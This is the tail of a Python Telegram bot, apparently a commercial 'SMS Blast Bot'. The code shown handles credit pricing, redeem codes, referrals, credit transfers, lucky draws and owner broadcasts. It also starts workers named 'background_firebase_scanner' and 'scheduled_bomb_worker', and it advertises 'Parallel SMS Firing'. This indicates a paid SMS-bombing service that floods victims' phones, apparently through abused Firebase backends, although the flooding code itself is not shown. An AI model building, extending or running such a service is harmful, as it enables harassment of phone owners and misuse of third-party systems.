async def owner_tournament_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    t = d.setdefault("tournaments", {})
    t["enabled"] = not t.get("enabled", False)
    save(d)
    status = "ENABLED" if t["enabled"] else "DISABLED"
    await cq.answer(f"✅ Tournament {status}!", show_alert=True)
    await owner_tournament_settings(cq, state)


# ================= LUCKY DRAW (OWNER) =================
@R.callback_query(F.data == "owner:lucky_draw")
async def owner_lucky_draw_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    ld = d.get("lucky_draw", {})
    status = "🟢 ON" if ld.get("enabled") else "🔴 OFF"
    credits = ld.get("credits", 50)
    last = ld.get("last_drawn", "Never")
    text = (f"🎲 <b>LUCKY DRAW</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Status: {status}\n\n💰 Prize: <b>{credits} credits</b>\n"
            f"📅 Frequency: <b>Weekly</b>\n"
            f"📅 Last Drawn: <b>{last if last else 'Never'}</b>")
    rows = [
        [InlineKeyboardButton(text=("🔴 Disable" if ld.get("enabled") else "🟢 Enable"), callback_data="owner:lucky:toggle")],
        [btn("💰 sᴇᴛ ᴄʀᴇᴅɪᴛs", "owner:lucky:setcredits", EMOJI_MONEY, "💰")],
        [btn("🎲 ᴅʀᴀᴡ ɴᴏᴡ", "owner:lucky:draw", EMOJI_GIFT, "🎲")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:lucky:toggle")
async def owner_lucky_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    ld = d.setdefault("lucky_draw", {"enabled": False, "credits": 50, "last_drawn": ""})
    ld["enabled"] = not ld.get("enabled", False)
    save(d)
    status = "ENABLED" if ld["enabled"] else "DISABLED"
    await cq.answer(f"✅ Lucky Draw {status}!", show_alert=True)
    await owner_lucky_draw_menu(cq, state)


@R.callback_query(F.data == "owner:lucky:setcredits")
async def owner_lucky_setcredits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.lucky_draw_credits)
    await cq.message.edit_text(f"💰 <b>Set Lucky Draw Prize</b>\n\nKitne credits prize dena hai?\n<i>Example: 50</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:lucky_draw")]), parse_mode="HTML")


@R.message(S.lucky_draw_credits)
async def owner_lucky_setcredits_set(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        if credits < 1: raise ValueError
    except:
        await msg.answer("❌ Valid number.", parse_mode="HTML"); return
    d.setdefault("lucky_draw", {})["credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(f"✅ Prize set: {credits} credits", reply_markup=kb([(f"{sc('back')}", "owner:lucky_draw")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:lucky:draw")
async def owner_lucky_draw_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("🎲 Drawing...", show_alert=True)
    await do_lucky_draw(cq.bot)
    try:
        await cq.message.edit_text(f"✅ <b>Lucky Draw Complete!</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:lucky_draw")]), parse_mode="HTML")
    except: pass


# ================= SUBSCRIPTION OWNER =================
@R.callback_query(F.data == "owner:sub:menu")
async def owner_sub_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    plans = d.get("subscription", {}).get("plans", [])
    text = f"💎 <b>Subscription Plans</b>\n━━━━━━━━━━━━━━━━━━\nTotal: <b>{len(plans)}</b>\n\n"
    for p in plans:
        text += f"• <b>{p['name']}</b> — {p['days']}d — ₹{p['price']}\n"
    rows = [
        [btn("➕ ᴀᴅᴅ ᴘʟᴀɴ", "owner:sub:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʀᴇᴍᴏᴠᴇ", "owner:sub:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


# ================= PRICING =================
@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"💳 <b>Pricing Plans ({len(plans)})</b>\n\n"
    for p in plans:
        disc = p.get("discount", 0)
        if disc > 0:
            text += f"• <b>{p['name']}</b> — {format_price_display(p['price'], disc)} = {p['credits']} credits\n"
        else:
            text += f"• <b>{p['name']}</b> — ₹{p['price']} = {p['credits']} credits\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", EMOJI_CHECK, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(f"💳 <b>Add Plan</b>\n\nStep 1/5: Name:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"💰 Price?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        await state.update_data(plan_price=float(msg.text.strip()))
    except:
        await msg.answer(f"❌ Number!", parse_mode="HTML"); return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"🎁 Credits?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        await state.update_data(plan_credits=int(msg.text.strip()))
    except:
        await msg.answer(f"❌ Number!", parse_mode="HTML"); return
    await state.set_state(S.add_plan_link)
    await msg.answer(f"🔗 Payment Link?", reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer(f"❌ URL!", parse_mode="HTML"); return
    await state.update_data(plan_link=link)
    await state.set_state(S.add_plan_discount)
    await msg.answer(f"✅ Link saved!\n\n💰 <b>Step 5/5: Discount</b>\n\nKitne % discount dena hai?\n<i>0 = No discount</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.message(S.add_plan_discount)
async def owner_pricing_discount_set(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        discount = float(msg.text.strip())
        if discount < 0 or discount > 100: raise ValueError
    except:
        await msg.answer("❌ Valid % (0-100).", parse_mode="HTML"); return
    fsmd = await state.get_data()
    plan = {"id": str(int(time.time())), "name": fsmd.get("plan_name", "Plan"),
            "price": fsmd.get("plan_price", 0), "credits": fsmd.get("plan_credits", 0),
            "currency": "INR", "payment_link": fsmd.get("plan_link", ""),
            "discount": discount}
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Plan Added!</b>", reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ None!", show_alert=True); return
    rows = [[btn(f"🗑 {p['name'][:20]}", f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(f"🗑 <b>Remove Plan</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    pid = cq.data.split(":")[-1]
    d["pricing"]["plans"] = [p for p in d["pricing"].get("plans", []) if p["id"] != pid]
    save(d)
    await cq.answer("🗑", show_alert=True)
    await owner_pricing_menu(cq, state)


# ================= REDEEM CODES =================
@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"🎁 <b>Redeem Codes ({len(codes)})</b>\n\n"
    for code, data in list(codes.items())[:10]:
        text += f"<code>{code}</code> — 💰{data['credits']} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ", "owner:redeem:gen", EMOJI_CHECK, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"🎁 <b>Generate Code</b>\n\nStep 1/2: Credits?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")


@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        await state.update_data(gen_credits=int(msg.text.strip()))
    except:
        await msg.answer(f"❌ Number!", parse_mode="HTML"); return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"🔢 Max Uses?", reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")


@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits, "uses_left": uses,
        "created_by": msg.from_user.id, "created_at": int(time.time()),
        "used_by": []
    }
    save(d)
    await state.clear()
    await msg.answer(f"🎉 <b>Code Generated!</b>\n\n🎁 <code>{code}</code>\n💰 {credits} credits\n🔢 {uses} uses",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ None!", show_alert=True); return
    rows = [[btn(f"🗑 {code}", f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")] for code in list(codes.keys())[:20]]
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(f"🗑 <b>Delete Code</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    code = cq.data.split(":")[-1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save(d)
    await cq.answer("🗑", show_alert=True)
    await owner_redeem_menu(cq, state)


# ================= USER CREDITS =================
@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    await cq.answer(f"💰 Credits: {get_user_credits(uid, d)}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)


# ================= USER REDEEM =================
@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    try:
        await cq.message.edit_text(f"🎁 <b>Redeem</b>\n\nCode enter karein:",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"❌ Invalid code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await msg.answer(f"❌ Expired!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    if uid in cd.get("used_by", []):
        await msg.answer(f"❌ Already used!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    credits = cd["credits"]
    add_credits(uid, credits, d)
    cd["uses_left"] -= 1
    cd.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(f"🎉 +{credits} credits!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")


# ================= USER REFER =================
@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    refer_count = d["users"].get(str(uid), {}).get("refer_count", 0)
    try:
        await cq.message.edit_text(
            f"👥 <b>Referral Program</b>\n\nHar referral pe <b>{ref_credits}</b> credits!\n\n"
            f"🎁 Your Code: <code>{code}</code>\n👥 Total Referred: <b>{refer_count}</b>\n\n"
            f"🔗 Link:\n<code>https://t.me/{me.username}?start={code}</code>",
            reply_markup=kb([(f"{sc('back')}", "user:page:2")]), parse_mode="HTML")
    except: pass


# ================= USER STATS =================
@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    v = get_validity_info(uid, d)
    v_str = "No plan" if not v["has_validity"] else (f"Expired ({v['plan_name']})" if v["is_expired"] else f"{v['plan_name']} ({v['days_left']}d)")
    try:
        await cq.message.edit_text(
            f"📊 <b>Your Stats</b>\n\n"
            f"💰 Credits: <b>{udata.get('credits', 0)}</b>\n"
            f"🎫 Validity: <b>{v_str}</b>\n"
            f"📤 SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
            f"👥 Referrals: <b>{udata.get('refer_count', 0)}</b>\n"
            f"📅 Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
            f"📈 Bot Total: <b>{stats.get('total_sent', 0)}</b>",
            reply_markup=kb([(f"{sc('back')}", "user:page:2")]), parse_mode="HTML")
    except: pass


# ================= USER SMS HISTORY =================
@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"📜 <b>History</b>\n\n❌ Koi SMS nahi."
    else:
        lines = [f"📜 <b>Your History</b> (Last 10)\n"]
        for i, e in enumerate(reversed(history), 1):
            ts = fmt_time(e.get("timestamp", 0))
            num = mask_number(e.get("number", "?"))
            st = e.get("status", "?")
            icon = "✅" if st == "sent" else "🛑" if st in ("stopped",) else "⏳"
            lines.append(f"{i}. [{ts}] {icon} <code>{num}</code>")
        text = "\n".join(lines)
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:page:2")]), parse_mode="HTML")
    except: pass


# ================= USER PRICING =================
@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans!", show_alert=True); return
    text = f"💰 <b>Buy Credits</b>\n\n"
    for p in plans:
        disc = p.get("discount", 0)
        if disc > 0:
            text += f"📋 <b>{p['name']}</b>\n   {format_price_display(p['price'], disc)} = {p['credits']} credits\n\n"
        else:
            text += f"📋 <b>{p['name']}</b>\n   💰 {p['price']} {p.get('currency','INR')} = {p['credits']} credits\n\n"
    rows = [[btn_url(f"Buy {sc(p['name'][:20])}", p['payment_link'], EMOJI_MONEY, "💳")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "user:page:2", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


# ================= USER INFO =================
@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.message.edit_text(
            f"ℹ️ <b>SMS Blast Bot {_VERSION}</b>\n\n"
            f"👤 Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
            f"💬 Support: Contact owner\n"
            f"🕐 IST: <code>{ist_time_str()}</code>",
            reply_markup=kb([(f"{sc('back')}", "user:page:2")]), parse_mode="HTML")
    except: pass


# ================= USER TRANSFER =================
@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    cc = get_user_credits(uid, d)
    if cc < 2:
        await cq.answer("❌ Min 2 credits!", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    try:
        await cq.message.edit_text(
            f"💸 <b>Transfer</b>\n\n💰 Yours: {cc}\n\nStep 1/2: Target User ID:",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    except: pass


@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target = int(msg.text.strip())
    except:
        await msg.answer(f"❌ Valid ID bhejo.", parse_mode="HTML"); return
    if target == uid or str(target) not in d.get("users", {}):
        await msg.answer(f"❌ Invalid target!", parse_mode="HTML"); return
    cc = get_user_credits(uid, d)
    if cc < 2:
        await msg.answer(f"❌ Min 2 credits!", parse_mode="HTML"); return
    await state.update_data(transfer_target=target)
    await state.set_state(S.transfer_credits_amount)
    half = cc // 2
    await msg.answer(f"💰 Yours: {cc}\n📤 Max: {half}\n\nKitne transfer?",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")


@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"❌ Valid number bhejo.", parse_mode="HTML"); return
    fsmd = await state.get_data()
    target = fsmd.get("transfer_target")
    cc = get_user_credits(uid, d)
    max_t = cc // 2
    if amt > max_t:
        await msg.answer(f"❌ Max {max_t}!", parse_mode="HTML"); return
    if not deduct_credits(uid, amt, d):
        await msg.answer(f"❌ Insufficient!", parse_mode="HTML"); return
    add_credits(target, amt, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(target, f"💸 +{amt} credits from <code>{uid}</code>!", parse_mode="HTML")
    except: pass
    await msg.answer(f"✅ Transferred {amt} credits!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")


# ================= EXTRA COMMANDS =================
@R.message(Command("stats"))
async def cmd_stats_direct(msg: Message):
    uid = msg.from_user.id
    d = load()
    if not can_use(uid, d):
        return
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    v = get_validity_info(uid, d)
    v_str = "No plan" if not v["has_validity"] else (f"Expired ({v['plan_name']})" if v["is_expired"] else f"{v['plan_name']} ({v['days_left']}d)")
    await msg.answer(
        f"📊 <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"🎫 Validity: <b>{v_str}</b>\n"
        f"📤 SMS: <b>{udata.get('uses', 0)}</b>\n"
        f"👥 Referrals: <b>{udata.get('refer_count', 0)}</b>\n\n"
        f"📈 Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=user_kb_page1(), parse_mode="HTML")


@R.message(Command("cancel"))
async def cmd_cancel(msg: Message, state: FSMContext):
    await state.clear()
    await msg.answer(f"❌ <b>Cancelled!</b>", reply_markup=user_kb_page1(), parse_mode="HTML")


# ================= OWNER COMMANDS =================
@R.message(Command("broadcast"))
async def cmd_broadcast(msg: Message):
    if msg.from_user.id != MAIN_OWNER:
        return
    text = msg.text.replace("/broadcast", "").strip()
    if not text:
        await msg.answer(f"⚠️ Usage: <code>/broadcast message</code>", parse_mode="HTML"); return
    d = load()
    users = list(d.get("users", {}).keys())
    if not users:
        await msg.answer("❌ No users!"); return
    status = await msg.answer(f"📤 Broadcasting to {len(users)} users...")
    ok = fail = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str),
                f"📢 <b>ANNOUNCEMENT</b>\n━━━━━━━━━━━━━━━━━━\n\n{text}\n\n━━━━━━━━━━━━━━━━━━\n👤 {SUPER_ADMIN_NAME}",
                parse_mode="HTML")
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    await status.edit_text(f"✅ Sent: {ok} | Failed: {fail}", parse_mode="HTML")


@R.message(Command("globalstats"))
async def cmd_global_stats(msg: Message):
    if msg.from_user.id != MAIN_OWNER:
        return
    d = load()
    users = d.get("users", {})
    stats = d.get("stats", {})
    total_credits = sum(u.get("credits", 0) for u in users.values())
    text = (
        f"📊 <b>GLOBAL STATS</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users: <b>{len(users)}</b>\n"
        f"💰 Credits in Circulation: <b>{total_credits}</b>\n"
        f"📤 Total Sent: <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ Total Failed: <b>{stats.get('total_failed', 0)}</b>\n"
        f"🔥 Firebases: <b>{len(d.get('firebases', []))}</b>\n"
        f"🕐 IST: <code>{ist_str('%d/%m/%Y %H:%M')}</code>"
    )
    await msg.answer(text, parse_mode="HTML")


# ================= FALLBACK =================
@R.message()
async def fallback_handler(msg: Message):
    if msg.text and msg.text.startswith("/"):
        return
    try:
        await msg.answer(
            f"❓ <b>Samajh nahi aaya!</b>\n\n/start bhejo ya menu use karo.",
            reply_markup=user_kb_page1(), parse_mode="HTML")
    except: pass


# ================= ERROR HANDLER =================
@R.errors()
async def error_handler(event):
    log.error(f"Error: {event.exception}", exc_info=event.exception)
    try:
        update = event.update
        if update.message:
            await update.message.answer(f"❌ <b>Error aaya!</b>\n<i>Please try again.</i>", parse_mode="HTML")
        elif update.callback_query:
            await update.callback_query.answer("❌ Error!", show_alert=True)
    except: pass


# ================= MAIN =================
async def main():
    log.info(f"Starting SMS Blast Bot {_VERSION}...")

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    dp.errors.register(error_handler)

    me = await bot.get_me()
    log.info(f"Bot: @{me.username} ({me.id})")

    # Start all workers
    tasks = [
        asyncio.create_task(background_firebase_scanner(bot)),
        asyncio.create_task(validity_expiry_worker(bot)),
        asyncio.create_task(renewal_reminder_worker(bot)),
        asyncio.create_task(scheduled_bomb_worker(bot)),
        asyncio.create_task(recurring_schedule_worker(bot)),
        asyncio.create_task(referral_contest_worker(bot)),
        asyncio.create_task(lucky_draw_worker(bot)),
        asyncio.create_task(tournament_worker(bot)),
        asyncio.create_task(auto_backup_worker(bot)),
    ]
    log.info(f"{len(tasks)} workers started")

    try:
        await bot.send_message(
            MAIN_OWNER,
            f"🚀 <b>{_VERSION} Online!</b>\n"
            f"@{me.username}\n"
            f"🕐 IST: <code>{ist_str('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"🆕 <b>Number Intelligence System</b>\n"
            f"⚡ <b>Parallel SMS Firing</b>\n"
            f"📞 <b>Universal Number Parser</b>\n\n"
            f"👤 Owner: {SUPER_ADMIN_NAME}",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")

    log.info("Starting polling...")
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types(), drop_pending_updates=True)
    except Exception as e:
        log.error(f"Polling error: {e}")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Stopped by user")
    except Exception as e:
        log.error(f"Fatal: {e}", exc_info=True)